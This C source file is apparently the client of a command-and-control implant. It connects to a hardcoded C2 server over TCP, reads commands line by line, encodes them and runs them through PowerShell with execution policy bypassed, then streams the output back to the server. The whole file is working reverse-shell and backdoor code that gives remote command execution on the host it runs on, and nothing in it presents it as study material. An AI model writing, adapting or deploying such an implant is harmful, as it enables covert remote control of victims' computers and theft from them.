#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "c2.h"

#define SERVER_IP "192.168.100.100"

static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Encode binary data to Base64 text.
void b64_encode(const unsigned char *in, int len, char *out) { 
    int i = 0, j = 0;
    unsigned char c3[3];
    while (len--) {
        c3[i++] = *(in++);
        if (i == 3) {
            out[j++] = b64[c3[0] >> 2];
            out[j++] = b64[((c3[0] & 3) << 4) | (c3[1] >> 4)];
            out[j++] = b64[((c3[1] & 15) << 2) | (c3[2] >> 6)];
            out[j++] = b64[c3[2] & 63];
            i = 0;
        }
    }
    if (i) {
        out[j++] = b64[c3[0] >> 2];
        out[j++] = b64[((c3[0] & 3) << 4) | (i == 2 ? (c3[1] >> 4) : 0)];
        out[j++] = (i == 2 ? b64[(c3[1] & 15) << 2] : '=');
        out[j++] = '=';
    }
    out[j] = '\0';
}

int main() {
    SOCK_INIT();

    // Create a TCP socket descriptor.
    sock_t sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv = {0};

    // Config
    serv.sin_family = AF_INET;
    serv.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, SERVER_IP, &serv.sin_addr);

    // Attempt to connect to c2server
    if (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
        return 1;
    }

    // Buffers for plaintext command, network IO, and final PowerShell command.
    char cmd[4096], buf[C2_BUF_SIZE], fullcmd[8192];

    while (1) {
        // Clear previous command contents
        memset(cmd, 0, sizeof(cmd));
        int i = 0;
        // Read one byte at a time
        while (1) {
            int r = recv(sock, buf + i, 1, 0);
            if (r <= 0) break;
            // When newline detected, terminate and copy into cmd buffer.
            if (buf[i] == '\n') { buf[i] = '\0'; strcpy(cmd, buf); break; } 
            i++;
        }
        if (!strlen(cmd)) continue;

        int cmdlen = strlen(cmd);

        // Encode received command
        unsigned short unicode[4096] = {0};
        for (int i = 0; i < cmdlen; i++) unicode[i] = cmd[i];
        char encoded[8192];
        b64_encode((unsigned char*)unicode, cmdlen * 2, encoded);

        // Compose final command string for _popen.
        snprintf(fullcmd, sizeof(fullcmd),
                 "powershell.exe -ep bypass -enc %s", encoded);

        // Launch PowerShell and capture stdout pipe.
        FILE *fp = _popen(fullcmd, "r");                      
        if (!fp) {
            send(sock, "[-] PowerShell failed\r\n" C2_EOF_MARK "\r\n", 35, 0);
            continue;
        }

        while (fgets(buf, sizeof(buf), fp)) {
            send(sock, buf, strlen(buf), 0);
        }
        _pclose(fp);
        // Signal completion with newline, marker, newline.
        send(sock, "\r\n" C2_EOF_MARK "\r\n", 6 + C2_EOF_MARK_LEN, 0); 
    }

    CLOSE_SOCK(sock);
    SHUT_DOWN();
    return 0;
}